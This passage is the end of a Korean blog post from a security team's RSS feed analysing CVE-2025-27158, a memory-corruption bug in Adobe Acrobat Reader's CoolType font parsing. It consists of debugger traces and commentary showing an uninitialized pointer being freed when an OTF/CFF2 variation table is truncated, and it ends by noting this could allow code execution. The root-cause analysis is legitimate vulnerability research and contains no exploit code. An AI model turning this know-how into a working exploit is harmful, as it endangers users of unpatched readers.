class="hljs-number">0</span>a02b330  <span class="hljs-number">00</span> <span class="hljs-number">00</span> e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................<span class="hljs-number">0</span>a02b340  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1B</span>EBeax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e73 esp=<span class="hljs-number">052f</span>c4a4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5943</span>:<span class="hljs-number">6</span>ee28e73 <span class="hljs-number">57</span>              push    edi<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1B</span>ECeax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e74 esp=<span class="hljs-number">052f</span>c4a0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5944</span>:<span class="hljs-number">6</span>ee28e74 <span class="hljs-number">66894602</span>        mov     word ptr [esi+<span class="hljs-number">2</span>],ax      ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b332=e0e0 &lt;-[<span class="hljs-number">11</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pBreakpoint <span class="hljs-number">1</span> hitTime Travel Position: E92BA:<span class="hljs-number">1B</span>EDeax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e78 esp=<span class="hljs-number">052f</span>c4a0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5948</span>:<span class="hljs-number">6</span>ee28e78 e8e63de6ff      call    CoolType!CTInit+<span class="hljs-number">0x195e3</span> (<span class="hljs-number">6</span>ec8cc63) &lt;-[<span class="hljs-number">12</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1</span>C07eax=<span class="hljs-number">00008000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e7d esp=<span class="hljs-number">052f</span>c4a0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei ng nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000286</span>CoolType!CTGetVersion+<span class="hljs-number">0xb594d</span>:<span class="hljs-number">6</span>ee28e7d b900800000      mov     ecx,<span class="hljs-number">8000</span>h<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1</span>C08eax=<span class="hljs-number">00008000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00008000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e82 esp=<span class="hljs-number">052f</span>c4a0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei ng nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000286</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5952</span>:<span class="hljs-number">6</span>ee28e82 <span class="hljs-number">66894604</span>        mov     word ptr [esi+<span class="hljs-number">4</span>],ax      ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b334=e0e0 &lt;-[<span class="hljs-number">13</span>][...]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1</span>C0Deax=<span class="hljs-number">00008000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00008000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e95 esp=<span class="hljs-number">052f</span>c4b8 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5965</span>:<span class="hljs-number">6</span>ee28e95 <span class="hljs-number">03</span>c0            add     eax,eax &lt;-[<span class="hljs-number">14</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1</span>C0Eeax=<span class="hljs-number">00010000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00008000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e97 esp=<span class="hljs-number">052f</span>c4b8 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000206</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5967</span>:<span class="hljs-number">6</span>ee28e97 <span class="hljs-number">50</span>              push    eax <span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1</span>C0Feax=<span class="hljs-number">00010000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00008000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e98 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000206</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5968</span>:<span class="hljs-number">6</span>ee28e98 e839cde4ff      call    CoolType!CTInit+<span class="hljs-number">0x2556</span> (<span class="hljs-number">6</span>ec75bd6) &lt;-[<span class="hljs-number">15</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92C1:<span class="hljs-number">108</span>eax=f2bca0c8 ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">6</span>ec75bfe edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e9d esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei ng nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000282</span>CoolType!CTGetVersion+<span class="hljs-number">0xb596d</span>:<span class="hljs-number">6</span>ee28e9d <span class="hljs-number">8365</span>ec00        <span class="hljs-keyword">and</span>     dword ptr [ebp<span class="hljs-number">-14</span>h],<span class="hljs-number">0</span> ss:<span class="hljs-number">002b</span>:<span class="hljs-number">052f</span>c4c8=f3a2e384<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; db f2bca0c8f2bca0c8  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca0d8  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca0e8  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca0f8  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca108  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca118  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca128  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca138  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92C1:<span class="hljs-number">109</span>eax=f2bca0c8 ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">6</span>ec75bfe edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28ea1 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5971</span>:<span class="hljs-number">6</span>ee28ea1 <span class="hljs-number">894608</span>          mov     dword ptr [esi+<span class="hljs-number">8</span>],eax ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b338=e0e0e0e0 &lt;-[<span class="hljs-number">16</span>][...]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92C1:<span class="hljs-number">10F</span>eax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00010000</span> edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28eb0 esp=<span class="hljs-number">052f</span>c4b8 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         ov up ei ng nz na pe cycs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000</span>a87CoolType!CTGetVersion+<span class="hljs-number">0xb5980</span>:<span class="hljs-number">6</span>ee28eb0 <span class="hljs-number">57</span>              push    edi          &lt;-[<span class="hljs-number">17</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92C1:<span class="hljs-number">110</span>eax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00010000</span> edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28eb1 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         ov up ei ng nz na pe cycs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000</span>a87CoolType!CTGetVersion+<span class="hljs-number">0xb5981</span>:<span class="hljs-number">6</span>ee28eb1 e8ad3de6ff      call    CoolType!CTInit+<span class="hljs-number">0x195e3</span> (<span class="hljs-number">6</span>ec8cc63)<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92C1:<span class="hljs-number">12</span>Aeax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28eb6 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5986</span>:<span class="hljs-number">6</span>ee28eb6 <span class="hljs-number">59</span>              pop     ecx<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; uCoolType!CTGetVersion+<span class="hljs-number">0xb5986</span>:<span class="hljs-number">6</span>ee28eb6 <span class="hljs-number">59</span>              pop     ecx<span class="hljs-number">6</span>ee28eb7 <span class="hljs-number">0f</span>b7d0          movzx   edx,ax<span class="hljs-number">6</span>ee28eba <span class="hljs-number">8b</span>4608          mov     eax,dword ptr [esi+<span class="hljs-number">8</span>]<span class="hljs-number">6</span>ee28ebd <span class="hljs-number">0f</span>b7cb          movzx   ecx,bx<span class="hljs-number">6</span>ee28ec0 <span class="hljs-number">43</span>              inc     ebx<span class="hljs-number">6</span>ee28ec1 <span class="hljs-number">66891448</span>        mov     word ptr [eax+ecx*<span class="hljs-number">2</span>],dx<span class="hljs-number">6</span>ee28ec5 <span class="hljs-number">663b</span>5e04        cmp     bx,word ptr [esi+<span class="hljs-number">4</span>]<span class="hljs-number">6</span>ee28ec9 <span class="hljs-number">72e5</span>            jb      CoolType!CTGetVersion+<span class="hljs-number">0xb5980</span> (<span class="hljs-number">6</span>ee28eb0) &lt;-[<span class="hljs-number">18</span>]</code></pre><p>[8], [10], [12]&#xC5D0;&#xC11C; &#xAC01;&#xAC01; <strong>itemCount, shortDeltaCount, regionIndexCount</strong> &#xAC12;&#xC744; &#xC77D;&#xC5B4;&#xC640; [9], [11], [13]&#xC744; &#xD1B5;&#xD574; 0a02b330, 0a02b330+2, 0a02b330+4 &#xC8FC;&#xC18C;&#xC5D0; write &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xC138; &#xAC00;&#xC9C0; &#xAC12;&#xC740; &#xCCAB; &#xBC88;&#xC9F8; &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xBA70;, &#xD2B9;&#xD788; regionIndexCount&#xC740; regionIndexes &#xBC30;&#xC5F4;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xACB0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[14]&#xC5D0;&#xC11C; regionIndexCount &#xAC12;(0x8000)&#xC744; &#xD1B5;&#xD574; &#xBC84;&#xD37C; &#xD06C;&#xAE30;(0x10000)&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; [15]&#xC5D0;&#xC11C; <code>CoolType!CTInit+0x2556</code>&#xC744; &#xD638;&#xCD9C;&#xD574; regionIndexes &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. </p><p>[16]&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; regionIndexes &#xBC84;&#xD37C;&#xC758; &#xD3EC;&#xC778;&#xD130;(0xf2bca0c8)&#xB97C; [4]&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xD55C; &#xBC84;&#xD37C;(0a02b330+8)&#xC5D0; &#xAE30;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[17]&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xD574; [18]&#xC5D0;&#xC11C; &#xB05D;&#xB098;&#xB294; &#xB8E8;&#xD504;&#xB294; &#xCCAB; &#xBC88;&#xC9F8; itemVariationData &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14; regionIndex&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xAC12;&#xC744; regionIndexes &#xBC84;&#xD37C;&#xC5D0; write &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C;, &#xD30C;&#xC77C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xBD80;&#xC871;&#xD574; regionIndexes &#xB370;&#xC774;&#xD130;&#xB97C; &#xBAA8;&#xB450; &#xC77D;&#xC9C0; &#xBABB;&#xD558;&#xBA74; &#xD560;&#xB2F9;&#xB41C; &#xBAA8;&#xB4E0; &#xBC84;&#xD37C;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cpp"><span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; gTime Travel Position: E9353:<span class="hljs-number">6</span>Deax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=f3a36e40 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000000</span>eip=<span class="hljs-number">6</span>ee279d9 esp=<span class="hljs-number">052f</span>c1d8 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44a9</span>:<span class="hljs-number">6</span>ee279d9 <span class="hljs-number">8b</span>863c020000    mov     eax,dword ptr [esi+<span class="hljs-number">23</span>Ch] ds:<span class="hljs-number">002b</span>:f3a2abac=<span class="hljs-number">0</span>a02b330<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; tTime Travel Position: E9353:<span class="hljs-number">6</span>Eeax=<span class="hljs-number">0</span>a02b330 ebx=<span class="hljs-number">00000000</span> ecx=f3a36e40 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000000</span>eip=<span class="hljs-number">6</span>ee279df esp=<span class="hljs-number">052f</span>c1d8 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44af</span>:<span class="hljs-number">6</span>ee279df ff740708        push    dword ptr [edi+eax+<span class="hljs-number">8</span>] ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b338=f2bca0c8 &lt;-[<span class="hljs-number">19</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; dd <span class="hljs-number">0</span>a02b330<span class="hljs-number">0</span>a02b330  <span class="hljs-number">00000000</span> e0e08000 f2bca0c8 e0e0e0e0<span class="hljs-number">0</span>a02b340  e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E9353:<span class="hljs-number">6F</span>eax=<span class="hljs-number">0</span>a02b330 ebx=<span class="hljs-number">00000000</span> ecx=f3a36e40 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000000</span>eip=<span class="hljs-number">6</span>ee279e3 esp=<span class="hljs-number">052f</span>c1d4 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44b3</span>:<span class="hljs-number">6</span>ee279e3 e82a4ce5ff      call    CoolType!CTInit+<span class="hljs-number">0x8f92</span> (<span class="hljs-number">6</span>ec7c612) &lt;-[<span class="hljs-number">20</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E935D:<span class="hljs-number">2382</span>eax=<span class="hljs-number">00000001</span> ebx=<span class="hljs-number">00000000</span> ecx=f2bca0c8 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000000</span>eip=<span class="hljs-number">6</span>ee279e8 esp=<span class="hljs-number">052f</span>c1d4 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44b8</span>:<span class="hljs-number">6</span>ee279e8 <span class="hljs-number">0f</span>b78638020000  movzx   eax,word ptr [esi+<span class="hljs-number">238</span>h]  ds:<span class="hljs-number">002b</span>:f3a2aba8=<span class="hljs-number">0002</span><span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; dd f2bca0c8  &lt;-[<span class="hljs-number">21</span>]f2bca0c8  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca0d8  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca0e8  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca0f8  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca108  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca118  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca128  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca138  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0[...]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; tTime Travel Position: E935D:<span class="hljs-number">2389</span>eax=<span class="hljs-number">0</span>a02b330 ebx=<span class="hljs-number">00000001</span> ecx=f2bca0c8 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000010</span>eip=<span class="hljs-number">6</span>ee279df esp=<span class="hljs-number">052f</span>c1d8 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei ng nz ac pe cycs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000297</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44af</span>:<span class="hljs-number">6</span>ee279df ff740708        push    dword ptr [edi+eax+<span class="hljs-number">8</span>] ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b348=e0e0e0e0  &lt;-[<span class="hljs-number">22</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; t Time Travel Position: E935D:<span class="hljs-number">238</span>Aeax=<span class="hljs-number">0</span>a02b330 ebx=<span class="hljs-number">00000001</span> ecx=f2bca0c8 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000010</span>eip=<span class="hljs-number">6</span>ee279e3 esp=<span class="hljs-number">052f</span>c1d4 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei ng nz ac pe cycs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000297</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44b3</span>:<span class="hljs-number">6</span>ee279e3 e82a4ce5ff      call    CoolType!CTInit+<span class="hljs-number">0x8f92</span> (<span class="hljs-number">6</span>ec7c612) &lt;-[<span class="hljs-number">23</span>]</code></pre><p>[19]&#xC5D0;&#xC11C; &#xCCAB; &#xBC88;&#xC9F8; regionIndexes &#xBC84;&#xD37C;&#xC758; &#xC8FC;&#xC18C;(0xf2bca0c8)&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0; push &#xD569;&#xB2C8;&#xB2E4;.</p><p>[20]&#xC5D0;&#xC11C; <code>CoolType!CTInit+0x8f92</code>&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xCCAB; &#xBC88;&#xC9F8; &#xBC84;&#xD37C;&#xB97C; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[22]&#xC5D0;&#xC11C; &#xB450; &#xBC88;&#xC9F8; &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14;&#xC758; regionIndexes &#xBC84;&#xD37C; &#xC8FC;&#xC18C;&#xB97C; push &#xD558;&#xB824; &#xD558;&#xC9C0;&#xB9CC;, &#xD560;&#xB2F9;&#xC774; &#xC548;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB354;&#xBBF8; &#xB370;&#xC774;&#xD130;(0xe0e0e0e0)&#xB97C; push &#xD574; [23] &#xC2E4;&#xD589; &#xC2DC; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xB294; [4]&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; &#xBC84;&#xD37C;(0x0a02b330)&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA74; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/Adobe-Acrobat-Reader/">Adobe Acrobat Reader</category>
      
      <category domain="https://hackyboiz.github.io/tags/Memory-Corruption/">Memory Corruption</category>
      
      <category domain="https://hackyboiz.github.io/tags/OTF/">OTF</category>
      
      <category domain="https://hackyboiz.github.io/tags/CFF2/">CFF2</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/23/ogu123/cve-2025-27158/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
